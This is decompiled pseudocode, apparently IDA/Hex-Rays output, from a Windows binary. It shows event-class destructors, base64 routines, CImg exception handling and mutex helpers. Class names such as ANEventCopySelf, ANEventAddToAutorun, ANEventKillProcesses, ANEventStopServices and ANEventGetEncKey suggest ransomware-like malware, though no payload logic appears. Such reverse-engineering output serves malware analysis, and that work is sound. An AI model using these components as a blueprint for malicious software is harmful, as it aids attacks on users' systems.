    if ( (unsigned int)(24 * ((this[6] - (int)v3) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
    this[4] = 0;
    this[5] = 0;
    this[6] = 0;
  }
  *this = &ANIEvent::`vftable';
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B17A8: using guessed type void *ANEventGetProcesses::`vftable';

//----- (0041B680) --------------------------------------------------------
_DWORD *__thiscall sub_41B680(_DWORD *Block, char a2)
{
  sub_41B5F0(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0041B6B0) --------------------------------------------------------
_DWORD *__thiscall sub_41B6B0(_DWORD *Block, char a2)
{
  *Block = &ANIEvent::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';

//----- (0041B6E0) --------------------------------------------------------
int __thiscall sub_41B6E0(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  int result; // eax

  *this = &ANEventCopySelf::`vftable';
  v2 = this[9];
  if ( v2 >= 8 )
  {
    v3 = (_DWORD *)this[4];
    if ( 2 * v2 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
  }
  result = 0;
  this[8] = 0;
  this[9] = 7;
  *((_WORD *)this + 8) = 0;
  *this = &ANIEvent::`vftable';
  return result;
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B19E8: using guessed type void *ANEventCopySelf::`vftable';

//----- (0041B750) --------------------------------------------------------
_DWORD *__thiscall sub_41B750(_DWORD *Block, char a2)
{
  sub_41B6E0(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0041B780) --------------------------------------------------------
int __thiscall sub_41B780(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  unsigned int v4; // ecx
  void *v5; // eax
  int result; // eax

  *this = &ANEventAddToAutorun::`vftable';
  v2 = this[15];
  if ( v2 >= 8 )
  {
    v3 = (_DWORD *)this[10];
    if ( 2 * v2 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        goto LABEL_12;
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
  }
  this[14] = 0;
  this[15] = 7;
  *((_WORD *)this + 20) = 0;
  v4 = this[9];
  if ( v4 >= 8 )
  {
    v5 = (void *)this[4];
    if ( 2 * v4 + 2 < 0x1000 )
    {
LABEL_10:
      sub_44775B(v5);
      goto LABEL_11;
    }
    if ( (unsigned int)v5 - *((_DWORD *)v5 - 1) - 4 <= 0x1F )
    {
      v5 = (void *)*((_DWORD *)v5 - 1);
      goto LABEL_10;
    }
LABEL_12:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_11:
  result = 0;
  this[8] = 0;
  this[9] = 7;
  *((_WORD *)this + 8) = 0;
  *this = &ANIEvent::`vftable';
  return result;
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B1960: using guessed type void *ANEventAddToAutorun::`vftable';

//----- (0041B830) --------------------------------------------------------
_DWORD *__thiscall sub_41B830(_DWORD *Block, char a2)
{
  sub_41B780(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0041B860) --------------------------------------------------------
void __thiscall sub_41B860(_DWORD *this)
{
  int v2; // ecx
  _DWORD *v3; // edi

  *this = &ANEventStopServices::`vftable';
  v2 = this[4];
  if ( v2 )
  {
    sub_4047B0(v2, this[5]);
    v3 = (_DWORD *)this[4];
    if ( (unsigned int)(24 * ((this[6] - (int)v3) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
    this[4] = 0;
    this[5] = 0;
    this[6] = 0;
  }
  *this = &ANIEvent::`vftable';
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B17C8: using guessed type void *ANEventStopServices::`vftable';

//----- (0041B8F0) --------------------------------------------------------
_DWORD *__thiscall sub_41B8F0(_DWORD *Block, char a2)
{
  sub_41B860(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0041B920) --------------------------------------------------------
void __thiscall sub_41B920(_DWORD *this)
{
  int v2; // ecx
  _DWORD *v3; // edi

  *this = &ANEventRemoveServices::`vftable';
  v2 = this[4];
  if ( v2 )
  {
    sub_4047B0(v2, this[5]);
    v3 = (_DWORD *)this[4];
    if ( (unsigned int)(24 * ((this[6] - (int)v3) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
    this[4] = 0;
    this[5] = 0;
    this[6] = 0;
  }
  *this = &ANIEvent::`vftable';
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B19D8: using guessed type void *ANEventRemoveServices::`vftable';

//----- (0041B9B0) --------------------------------------------------------
_DWORD *__thiscall sub_41B9B0(_DWORD *Block, char a2)
{
  sub_41B920(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0041B9E0) --------------------------------------------------------
void __thiscall sub_41B9E0(_DWORD *this)
{
  int v2; // ecx
  _DWORD *v3; // edi

  *this = &ANEventKillProcesses::`vftable';
  v2 = this[4];
  if ( v2 )
  {
    sub_4047B0(v2, this[5]);
    v3 = (_DWORD *)this[4];
    if ( (unsigned int)(24 * ((this[6] - (int)v3) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
    this[4] = 0;
    this[5] = 0;
    this[6] = 0;
  }
  *this = &ANIEvent::`vftable';
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B1798: using guessed type void *ANEventKillProcesses::`vftable';

//----- (0041BA70) --------------------------------------------------------
_DWORD *__thiscall sub_41BA70(_DWORD *Block, char a2)
{
  sub_41B9E0(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0041BAA0) --------------------------------------------------------
void __thiscall sub_41BAA0(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax

  *this = &ANEventInitFileProcess::`vftable';
  v2 = this[9];
  if ( v2 >= 0x10 )
  {
    v3 = (_DWORD *)this[4];
    if ( v2 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
  }
  this[8] = 0;
  this[9] = 15;
  *((_BYTE *)this + 16) = 0;
  *this = &ANIEvent::`vftable';
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B17D8: using guessed type void *ANEventInitFileProcess::`vftable';

//----- (0041BB00) --------------------------------------------------------
_DWORD *__thiscall sub_41BB00(_DWORD *Block, char a2)
{
  sub_41BAA0(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0041BB30) --------------------------------------------------------
int __thiscall sub_41BB30(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  int result; // eax

  *this = &ANEventGetExternalIP::`vftable';
  v2 = this[9];
  if ( v2 >= 8 )
  {
    v3 = (_DWORD *)this[4];
    if ( 2 * v2 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
  }
  result = 0;
  this[8] = 0;
  this[9] = 7;
  *((_WORD *)this + 8) = 0;
  *this = &ANIEvent::`vftable';
  return result;
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B1A1C: using guessed type void *ANEventGetExternalIP::`vftable';

//----- (0041BBA0) --------------------------------------------------------
_DWORD *__thiscall sub_41BBA0(_DWORD *Block, char a2)
{
  sub_41BB30(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0041BBD0) --------------------------------------------------------
void __thiscall sub_41BBD0(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax

  *this = &ANEventGetEncKey::`vftable';
  v2 = this[9];
  if ( v2 >= 0x10 )
  {
    v3 = (_DWORD *)this[4];
    if ( v2 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
  }
  this[8] = 0;
  this[9] = 15;
  *((_BYTE *)this + 16) = 0;
  *this = &ANIEvent::`vftable';
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B17D0: using guessed type void *ANEventGetEncKey::`vftable';

//----- (0041BC30) --------------------------------------------------------
_DWORD *__thiscall sub_41BC30(_DWORD *Block, char a2)
{
  sub_41BBD0(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0041BC60) --------------------------------------------------------
void **__fastcall sub_41BC60(void **Src, char *a2, int a3)
{
  int v4; // ecx
  int v5; // esi
  unsigned __int8 v6; // bl
  unsigned __int8 v7; // bh
  int i; // esi
  void **v9; // ecx
  unsigned int v10; // edx
  char v11; // bl
  unsigned int v12; // ecx
  _DWORD *v13; // eax
  int v14; // eax
  bool v15; // cf
  unsigned __int8 v16; // cl
  int v17; // ebx
  int v18; // esi
  void **v19; // ecx
  unsigned int v20; // edx
  char v21; // al
  unsigned int v22; // ecx
  _DWORD *v23; // eax
  int v24; // ebx
  unsigned int v25; // ecx
  unsigned int v26; // edx
  _DWORD *v27; // eax
  char *v30; // [esp+18h] [ebp-20h]
  char v31; // [esp+1Eh] [ebp-1Ah]
  char v32; // [esp+1Fh] [ebp-19h]
  char v33; // [esp+20h] [ebp-18h]
  char v34; // [esp+21h] [ebp-17h]
  char v35; // [esp+22h] [ebp-16h]
  char v36; // [esp+23h] [ebp-15h]
  char v37[4]; // [esp+24h] [ebp-14h]
  char v38[4]; // [esp+28h] [ebp-10h]
  int v39; // [esp+34h] [ebp-4h]
  int v40; // [esp+40h] [ebp+8h]

  Src[4] = 0;
  Src[5] = (void *)15;
  *(_BYTE *)Src = 0;
  v4 = a3;
  v5 = 0;
  v39 = 0;
  if ( a3 )
  {
    do
    {
      --v4;
      v38[v5++] = *a2++;
      v6 = v38[0];
      v7 = v38[1];
      v40 = v4;
      v30 = a2;
      v31 = v38[2];
      v32 = v38[0];
      if ( v5 == 3 )
      {
        v33 = (unsigned __int8)v38[0] >> 2;
        v34 = ((unsigned __int8)v38[1] >> 4) + 16 * (v38[0] & 3);
        v35 = ((unsigned __int8)v38[2] >> 6) + 4 * (v38[1] & 0xF);
        v36 = v38[2] & 0x3F;
        for ( i = 0; i < 4; ++i )
        {
          v9 = &dword_4FA0F0;
          if ( (unsigned int)dword_4FA104 >= 0x10 )
            v9 = (void **)dword_4FA0F0;
          v10 = (unsigned int)Src[5];
          v11 = *((_BYTE *)v9 + (unsigned __int8)*(&v33 + i));
          v12 = (unsigned int)Src[4];
          v37[0] = v11;
          if ( v12 >= v10 )
          {
            sub_40D800(Src, 1u, (int)Src, v37[0]);
          }
          else
          {
            Src[4] = (void *)(v12 + 1);
            v13 = Src;
            if ( v10 >= 0x10 )
              v13 = *Src;
            *((_BYTE *)v13 + v12) = v11;
            *((_BYTE *)v13 + v12 + 1) = 0;
          }
        }
        v4 = v40;
        v5 = 0;
        a2 = v30;
        v6 = v32;
      }
    }
    while ( v4 );
    *(_DWORD *)v37 = v5;
    if ( v5 )
    {
      v14 = v5;
      if ( v5 >= 3 )
      {
        v16 = v31;
      }
      else
      {
        v15 = (unsigned int)v5 < 3;
        do
        {
          if ( !v15 )
            __report_rangecheckfailure();
          v38[v14++] = 0;
          v15 = (unsigned int)v14 < 3;
        }
        while ( v14 < 3 );
        v16 = v38[2];
        v7 = v38[1];
        v6 = v38[0];
      }
      v33 = v6 >> 2;
      v34 = (v7 >> 4) + 16 * (v6 & 3);
      v36 = v16 & 0x3F;
      v35 = (v16 >> 6) + 4 * (v7 & 0xF);
      v17 = 0;
      if ( v5 + 1 > 0 )
      {
        v18 = v5 + 1;
        do
        {
          v19 = &dword_4FA0F0;
          if ( (unsigned int)dword_4FA104 >= 0x10 )
            v19 = (void **)dword_4FA0F0;
          v20 = (unsigned int)Src[5];
          v21 = *((_BYTE *)v19 + (unsigned __int8)*(&v33 + v17));
          v22 = (unsigned int)Src[4];
          v38[0] = v21;
          if ( v22 >= v20 )
          {
            sub_40D800(Src, 1u, (int)Src, v38[0]);
          }
          else
          {
            Src[4] = (void *)(v22 + 1);
            v23 = Src;
            if ( v20 >= 0x10 )
              v23 = *Src;
            *((_BYTE *)v23 + v22) = v38[0];
            *((_BYTE *)v23 + v22 + 1) = 0;
          }
          ++v17;
        }
        while ( v17 < v18 );
        v5 = *(_DWORD *)v37;
      }
      if ( v5 < 3 )
      {
        v24 = 3 - v5;
        do
        {
          v25 = (unsigned int)Src[4];
          v26 = (unsigned int)Src[5];
          if ( v25 >= v26 )
          {
            sub_40D800(Src, 1u, (int)Src, 61);
          }
          else
          {
            Src[4] = (void *)(v25 + 1);
            v27 = Src;
            if ( v26 >= 0x10 )
              v27 = *Src;
            *(_WORD *)((char *)v27 + v25) = 61;
          }
          --v24;
        }
        while ( v24 );
      }
    }
  }
  return Src;
}
// 4478AD: using guessed type void __noreturn __report_rangecheckfailure(void);
// 4FA104: using guessed type int dword_4FA104;

//----- (0041BEC0) --------------------------------------------------------
void **__fastcall sub_41BEC0(void **Src, _DWORD *a2)
{
  int v3; // ebx
  unsigned int v4; // esi
  int v5; // ecx
  _DWORD *v6; // eax
  unsigned int v7; // ecx
  _DWORD *v8; // eax
  unsigned __int8 v9; // bl
  _DWORD *v10; // eax
  size_t v11; // ecx
  unsigned int i; // esi
  void **v13; // ebx
  void *v14; // eax
  char v15; // al
  unsigned int v16; // esi
  char v17; // bl
  unsigned int v18; // ecx
  unsigned int v19; // edx
  _DWORD *v20; // eax
  unsigned int j; // eax
  size_t v22; // ecx
  unsigned int v23; // eax
  char *v24; // eax
  void **v25; // ebx
  char v26; // al
  void *v27; // eax
  char v28; // al
  unsigned int v29; // eax
  unsigned int v30; // esi
  char v31; // bl
  unsigned int v32; // ecx
  unsigned int v33; // edx
  _DWORD *v34; // eax
  int v37; // [esp+18h] [ebp-24h]
  _DWORD *v38; // [esp+1Ch] [ebp-20h]
  unsigned int v39; // [esp+1Ch] [ebp-20h]
  char v40; // [esp+20h] [ebp-1Ch]
  char v41; // [esp+21h] [ebp-1Bh]
  char v42; // [esp+22h] [ebp-1Ah]
  char v43; // [esp+24h] [ebp-18h] BYREF
  unsigned __int8 v44; // [esp+25h] [ebp-17h]
  unsigned __int8 v45; // [esp+26h] [ebp-16h]
  char v46; // [esp+27h] [ebp-15h]
  char v47[4]; // [esp+28h] [ebp-14h]
  char v48[4]; // [esp+2Ch] [ebp-10h]
  int v49; // [esp+38h] [ebp-4h]

  v38 = a2;
  *(_DWORD *)v48 = Src;
  v3 = 0;
  v4 = 0;
  v5 = a2[4];
  *(_DWORD *)(*(_DWORD *)v48 + 16) = 0;
  Src[5] = (void *)15;
  v37 = 0;
  *(_BYTE *)Src = 0;
  v49 = 0;
  if ( v5 )
  {
    do
    {
      v6 = a2;
      *(_DWORD *)v48 = v5 - 1;
      v7 = a2[5];
      if ( v7 >= 0x10 )
        v6 = (_DWORD *)*a2;
      if ( *((_BYTE *)v6 + v3) == 61 )
        break;
      v8 = a2;
      if ( v7 >= 0x10 )
        v8 = (_DWORD *)*a2;
      v9 = *((_BYTE *)v8 + v3);
      if ( !sub_4624C4(v9) && v9 != 43 && v9 != 47 )
        break;
      a2 = v38;
      v10 = v38;
      if ( v38[5] >= 0x10u )
        v10 = (_DWORD *)*v38;
      v3 = v37 + 1;
      *(&v43 + v4++) = *((_BYTE *)v10 + v37++);
      if ( v4 == 4 )
      {
        v11 = dword_4FA100;
        for ( i = 0; i < 4; ++i )
        {
          v13 = &dword_4FA0F0;
          if ( (unsigned int)dword_4FA104 >= 0x10 )
            v13 = (void **)dword_4FA0F0;
          if ( v11 && (v14 = memchr(v13, *(&v43 + i), v11)) != 0 )
            v15 = (_BYTE)v14 - (_BYTE)v13;
          else
            v15 = -1;
          v11 = dword_4FA100;
          *(&v43 + i) = v15;
        }
        v40 = 4 * v43 + ((v44 >> 4) & 3);
        v41 = 16 * v44 + ((v45 >> 2) & 0xF);
        v16 = 0;
        v42 = v46 + (v45 << 6);
        do
        {
          v17 = *(&v40 + v16);
          v18 = (unsigned int)Src[4];
          v19 = (unsigned int)Src[5];
          v47[0] = v17;
          if ( v18 >= v19 )
          {
            sub_40D800(Src, 1u, (int)Src, v47[0]);
          }
          else
          {
            Src[4] = (void *)(v18 + 1);
            v20 = Src;
            if ( v19 >= 0x10 )
              v20 = *Src;
            *((_BYTE *)v20 + v18) = v17;
            *((_BYTE *)v20 + v18 + 1) = 0;
          }
          ++v16;
        }
        while ( v16 < 3 );
        a2 = v38;
        v4 = 0;
        v3 = v37;
      }
      v5 = *(_DWORD *)v48;
    }
    while ( *(_DWORD *)v48 );
    if ( v4 )
    {
      for ( j = v4; j < 4; ++j )
        *(&v43 + j) = 0;
      v22 = dword_4FA100;
      v23 = 0;
      v39 = 0;
      do
      {
        v24 = &v43 + v23;
        v25 = &dword_4FA0F0;
        *(_DWORD *)v48 = v24;
        if ( (unsigned int)dword_4FA104 >= 0x10 )
          v25 = (void **)dword_4FA0F0;
        v26 = *v24;
        if ( v22 && (v27 = memchr(v25, v26, v22)) != 0 )
          v28 = (_BYTE)v27 - (_BYTE)v25;
        else
          v28 = -1;
        **(_BYTE **)v48 = v28;
        v22 = dword_4FA100;
        v23 = v39 + 1;
        v39 = v23;
      }
      while ( v23 < 4 );
      v40 = 4 * v43 + ((v44 >> 4) & 3);
      v29 = v4 - 1;
      v41 = 16 * v44 + ((v45 >> 2) & 0xF);
      v30 = 0;
      v42 = v46 + (v45 << 6);
      for ( *(_DWORD *)v47 = v29; v30 < *(_DWORD *)v47; ++v30 )
      {
        v31 = *(&v40 + v30);
        v32 = (unsigned int)Src[4];
        v33 = (unsigned int)Src[5];
        v48[0] = v31;
        if ( v32 >= v33 )
        {
          sub_40D800(Src, 1u, (int)Src, v48[0]);
        }
        else
        {
          Src[4] = (void *)(v32 + 1);
          v34 = Src;
          if ( v33 >= 0x10 )
            v34 = *Src;
          *((_BYTE *)v34 + v32) = v31;
          *((_BYTE *)v34 + v32 + 1) = 0;
        }
      }
    }
  }
  return Src;
}
// 4FA104: using guessed type int dword_4FA104;

//----- (0041C190) --------------------------------------------------------
int __cdecl sub_41C190(int *a1, int a2, int a3, int a4)
{
  return sub_41AF20(a1, a2, a3, (int)a1, (int)&a4);
}

//----- (0041C1B0) --------------------------------------------------------
char *__thiscall sub_41C1B0(char *this, int a2)
{
  size_t v3; // esi
  char *v4; // eax

  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &cimg_library::CImgException::`vftable';
  v3 = strlen(*(const char **)(a2 + 12));
  v4 = (char *)unknown_libname_86(v3 + 1);
  *((_DWORD *)this + 3) = v4;
  strncpy(v4, *(const char **)(a2 + 12), v3);
  *(_BYTE *)(v3 + *((_DWORD *)this + 3)) = 0;
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);
// 45E3C0: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 48F974: using guessed type void *std::exception::`vftable';
// 4B1A10: using guessed type void *cimg_library::CImgException::`vftable';

//----- (0041C250) --------------------------------------------------------
int __thiscall sub_41C250(_DWORD *this)
{
  void *v3; // [esp-4h] [ebp-8h]

  v3 = (void *)this[3];
  *this = &cimg_library::CImgException::`vftable';
  j_j__free(v3);
  *this = &std::exception::`vftable';
  return __std_exception_destroy(this + 1);
}
// 45E423: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 48F974: using guessed type void *std::exception::`vftable';
// 4B1A10: using guessed type void *cimg_library::CImgException::`vftable';

//----- (0041C280) --------------------------------------------------------
int __thiscall sub_41C280(_DWORD *this)
{
  return this[3];
}

//----- (0041C290) --------------------------------------------------------
_DWORD *__thiscall sub_41C290(_DWORD *Block, char a2)
{
  void *v4; // [esp-4h] [ebp-8h]

  v4 = (void *)Block[3];
  *Block = &cimg_library::CImgException::`vftable';
  j_j__free(v4);
  *Block = &std::exception::`vftable';
  __std_exception_destroy(Block + 1);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 45E423: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 48F974: using guessed type void *std::exception::`vftable';
// 4B1A10: using guessed type void *cimg_library::CImgException::`vftable';

//----- (0041C2D0) --------------------------------------------------------
int __cdecl sub_41C2D0(int a1, int a2, int a3)
{
  _BYTE *v3; // eax
  int *v4; // eax
  int v5; // esi
  int *v6; // eax
  int *v7; // eax
  int v8; // ecx
  int *v9; // eax
  const char *v10; // esi
  int v11; // eax
  int *v13; // [esp+18h] [ebp-10h]

  *(_QWORD *)(a1 + 4) = 0i64;
  *(_DWORD *)a1 = &cimg_library::CImgException::`vftable';
  v3 = (_BYTE *)unknown_libname_86(1);
  *(_DWORD *)(a1 + 12) = v3;
  *v3 = 0;
  *(_DWORD *)a1 = &cimg_library::CImgArgumentException::`vftable';
  v4 = sub_41C6E0();
  WaitForSingleObject((HANDLE)v4[6], 0xFFFFFFFF);
  v5 = sub_41AF90((int)&a3);
  v6 = sub_41C6E0();
  ReleaseMutex((HANDLE)v6[6]);
  if ( v5 >= 0 )
  {
    j_j__free(*(void **)(a1 + 12));
    v13 = (int *)unknown_libname_86(v5 + 1);
    *(_DWORD *)(a1 + 12) = v13;
    v7 = sub_41C6E0();
    WaitForSingleObject((HANDLE)v7[6], 0xFFFFFFFF);
    if ( sub_41AF60(v13, v5 + 1, v8, a2, v8, (int)&a3) == -1 )
      sub_41AF90((int)&a3);
    v9 = sub_41C6E0();
    ReleaseMutex((HANDLE)v9[6]);
    if ( dword_4F89F0 )
    {
      v10 = *(const char **)(a1 + 12);
      v11 = sub_41C750();
      sub_41AF00(v11, (int)"\n%s[CImg] *** %s ***%s %s\n", byte_4B14F0, "CImgArgumentException", byte_4B14F0, v10);
      if ( (unsigned int)dword_4F89F0 >= 3 )
        sub_41CAB0();
    }
  }
  return a1;
}
// 41C39B: conditional instruction was optimized away because esi.4>=0
// 41C3A9: variable 'v8' is possibly undefined
// 41CAB0: using guessed type int sub_41CAB0(void);
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);
// 4B177C: using guessed type void *cimg_library::CImgArgumentException::`vftable';
// 4B1A10: using guessed type void *cimg_library::CImgException::`vftable';
// 4F89F0: using guessed type int dword_4F89F0;

//----- (0041C430) --------------------------------------------------------
int __cdecl sub_41C430(int a1, int a2, int a3)
{
  _BYTE *v3; // eax
  int *v4; // eax
  int v5; // esi
  int *v6; // eax
  int *v7; // eax
  int v8; // ecx
  int *v9; // eax
  const char *v10; // esi
  int v11; // eax
  int *v13; // [esp+14h] [ebp-10h]

  *(_QWORD *)(a1 + 4) = 0i64;
  *(_DWORD *)a1 = &cimg_library::CImgException::`vftable';
  v3 = (_BYTE *)unknown_libname_86(1);
  *(_DWORD *)(a1 + 12) = v3;
  *v3 = 0;
  *(_DWORD *)a1 = &cimg_library::CImgInstanceException::`vftable';
  v4 = sub_41C6E0();
  WaitForSingleObject((HANDLE)v4[6], 0xFFFFFFFF);
  v5 = sub_41AF90((int)&a3);
  v6 = sub_41C6E0();
  ReleaseMutex((HANDLE)v6[6]);
  if ( v5 >= 0 )
  {
    j_j__free(*(void **)(a1 + 12));
    v13 = (int *)unknown_libname_86(v5 + 1);
    *(_DWORD *)(a1 + 12) = v13;
    v7 = sub_41C6E0();
    WaitForSingleObject((HANDLE)v7[6], 0xFFFFFFFF);
    if ( sub_41AF60(v13, v5 + 1, v8, a2, v8, (int)&a3) == -1 )
      sub_41AF90((int)&a3);
    v9 = sub_41C6E0();
    ReleaseMutex((HANDLE)v9[6]);
    if ( dword_4F89F0 )
    {
      v10 = *(const char **)(a1 + 12);
      v11 = sub_41C750();
      sub_41AF00(v11, (int)"\n%s[CImg] *** %s ***%s %s\n", byte_4B14F0, "CImgInstanceException", byte_4B14F0, v10);
      if ( (unsigned int)dword_4F89F0 >= 3 )
        sub_41CAB0();
    }
  }
  return a1;
}
// 41C4F8: conditional instruction was optimized away because esi.4>=0
// 41C506: variable 'v8' is possibly undefined
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);
// 4B1918: using guessed type void *cimg_library::CImgInstanceException::`vftable';
// 4B1A10: using guessed type void *cimg_library::CImgException::`vftable';
// 4F89F0: using guessed type int dword_4F89F0;

//----- (0041C580) --------------------------------------------------------
int __cdecl sub_41C580(int a1, int a2, int a3)
{
  _BYTE *v3; // eax
  int *v4; // eax
  int v5; // esi
  int *v6; // eax
  int *v7; // eax
  int v8; // ecx
  int *v9; // eax
  const char *v10; // esi
  int v11; // eax
  int *v13; // [esp+14h] [ebp-10h]

  *(_QWORD *)(a1 + 4) = 0i64;
  *(_DWORD *)a1 = &cimg_library::CImgException::`vftable';
  v3 = (_BYTE *)unknown_libname_86(1);
  *(_DWORD *)(a1 + 12) = v3;
  *v3 = 0;
  *(_DWORD *)a1 = &cimg_library::CImgIOException::`vftable';
  v4 = sub_41C6E0();
  WaitForSingleObject((HANDLE)v4[6], 0xFFFFFFFF);
  v5 = sub_41AF90((int)&a3);
  v6 = sub_41C6E0();
  ReleaseMutex((HANDLE)v6[6]);
  if ( v5 >= 0 )
  {
    j_j__free(*(void **)(a1 + 12));
    v13 = (int *)unknown_libname_86(v5 + 1);
    *(_DWORD *)(a1 + 12) = v13;
    v7 = sub_41C6E0();
    WaitForSingleObject((HANDLE)v7[6], 0xFFFFFFFF);
    if ( sub_41AF60(v13, v5 + 1, v8, a2, v8, (int)&a3) == -1 )
      sub_41AF90((int)&a3);
    v9 = sub_41C6E0();
    ReleaseMutex((HANDLE)v9[6]);
    if ( dword_4F89F0 )
    {
      v10 = *(const char **)(a1 + 12);
      v11 = sub_41C750();
      sub_41AF00(v11, (int)"\n%s[CImg] *** %s ***%s %s\n", byte_4B14F0, "CImgIOException", byte_4B14F0, v10);
      if ( (unsigned int)dword_4F89F0 >= 3 )
        sub_41CAB0();
    }
  }
  return a1;
}
// 41C648: conditional instruction was optimized away because esi.4>=0
// 41C656: variable 'v8' is possibly undefined
// 41CAB0: using guessed type int sub_41CAB0(void);
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);
// 4B1954: using guessed type void *cimg_library::CImgIOException::`vftable';
// 4B1A10: using guessed type void *cimg_library::CImgException::`vftable';
// 4F89F0: using guessed type int dword_4F89F0;

//----- (0041C6D0) --------------------------------------------------------
const char *sub_41C6D0()
{
  return "unsigned char";
}

//----- (0041C6E0) --------------------------------------------------------
int *sub_41C6E0()
{
  unsigned int i; // esi

  if ( dword_500AD8 > *(_DWORD *)(*(_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + 4) )
  {
    _Init_thread_header(&dword_500AD8);
    if ( dword_500AD8 == -1 )
    {
      for ( i = 0; i < 32; ++i )
        dword_5009F8[i] = (int)CreateMutexW(0, 0, 0);
      _Init_thread_footer(&dword_500AD8);
    }
  }
  return dword_5009F8;
}
// 447A70: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 447ABA: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 5009F8: using guessed type int dword_5009F8[];
// 500AD8: using guessed type int dword_500AD8;

//----- (0041C750) --------------------------------------------------------
int sub_41C750()
{
  int *v0; // eax
  int *v1; // eax

  v0 = sub_41C6E0();
  WaitForSingleObject((HANDLE)v0[1], 0xFFFFFFFF);
  if ( dword_500A8C > *(_DWORD *)(*(_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + 4) )
  {
    _Init_thread_header(&dword_500A8C);
    if ( dword_500A8C == -1 )
    {
      dword_500AF4 = (int)__acrt_iob_func(2u);
      _Init_thread_footer(&dword_500A8C);
    }
  }
  v1 = sub_41C6E0();
  ReleaseMutex((HANDLE)v1[1]);
  return dword_500AF4;
}
// 447A70: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 447ABA: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 500A8C: using guessed type int dword_500A8C;
// 500AF4: using guessed type int dword_500AF4;

//----- (0041C7C0) --------------------------------------------------------
int __fastcall sub_41C7C0(int a1, int a2)
{
  int *v4; // eax
  int *v5; // eax

  if ( a2 )
  {
    if ( a2 == 1 )
    {
      v4 = sub_41C6E0();
      WaitForSingleObject((HANDLE)v4[a1], 0xFFFFFFFF);
    }
    else
    {
      sub_41C6E0();
    }
    return 0;
  }
  else
  {
    v5 = sub_41C6E0();
    ReleaseMutex((HANDLE)v5[a1]);
    return 0;
  }
}

